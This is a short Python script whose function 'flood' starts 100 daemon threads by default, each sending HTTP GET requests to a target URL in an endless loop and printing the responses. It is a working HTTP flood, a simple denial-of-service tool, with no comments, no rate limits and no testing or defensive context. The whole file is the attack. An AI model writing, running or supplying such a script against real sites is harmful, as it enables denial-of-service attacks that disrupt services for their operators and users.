import requests
import threading

def flood(url, thread_count=100):
    def send_request():
        while True:
            try:
                response = requests.get(url)
                print(f"[{url}] Status: {response.status_code}")
            except Exception as e:
                print(f"[{url}] Error: {e}")
    
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request, daemon=True)
        thread.start()